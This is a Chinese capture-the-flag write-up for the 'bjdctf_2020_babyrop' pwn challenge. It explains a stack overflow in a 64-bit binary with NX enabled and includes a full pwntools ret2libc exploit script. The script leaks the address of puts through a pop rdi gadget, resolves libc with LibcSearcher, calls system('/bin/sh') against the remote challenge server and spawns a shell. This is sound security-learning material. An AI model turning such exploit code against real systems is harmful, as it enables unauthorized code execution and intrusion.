首先检查安全机制

![image-20201107205948502](https://static.hack1s.fun/images/2021/02/06/image-20201107205948502.png)

开启了NX的64位程序

![image-20201107210109388](https://static.hack1s.fun/images/2021/02/06/image-20201107210109388.png)

vuln函数就是一个read读了0x64，但是距离rbp只有0x20，造成溢出

本质上和上面那道题目是一样的，就是ret2libc

首先通过puts函数泄漏puts在got表中的地址

之后用LibcSearcher查找libc的版本，最后调用`system("/bin/sh")`

但是也存在一点点和前面差异的地方

一是puts函数在得到地址的时候是一个6字节的值，而不是8字节，需要一点点处理

另外就是因为程序是64位的，需要通过rdi传参

```python
from pwn import *
from LibcSearcher import *

io = remote('node3.buuoj.cn',29286)
#io = process('./bjdctf_2020_babyrop')
elf = ELF('./bjdctf_2020_babyrop')

io.recvuntil('story!\n')

plt_puts = elf.plt['puts']
got_puts = elf.got['puts']
vuln = elf.sym['vuln']

pop_rdi = 0x400733

payload = 'a'*0x20 + 'b'*0x8 + p64(pop_rdi) + p64(got_puts) + p64(plt_puts) + p64(vuln)
io.sendline(payload)

real_puts = u64(io.recv(6)+'\x00\x00')

libc = LibcSearcher(address=real_puts,func='puts')

libc_base = real_puts - libc.dump('puts')


payload = 'a'*0x20 + 'b'*0x8 + p64(pop_rdi) + p64(libc.dump('str_bin_sh')+libc_base) + p64(libc.dump('system')+libc_base)

io.sendline(payload)
io.interactive()
```

这个代码在执行时会查到好几个版本的Libc，其中选择的是标号为2的可以拿到shell

![image-20201107221552664](https://static.hack1s.fun/images/2021/02/06/image-20201107221552664.png)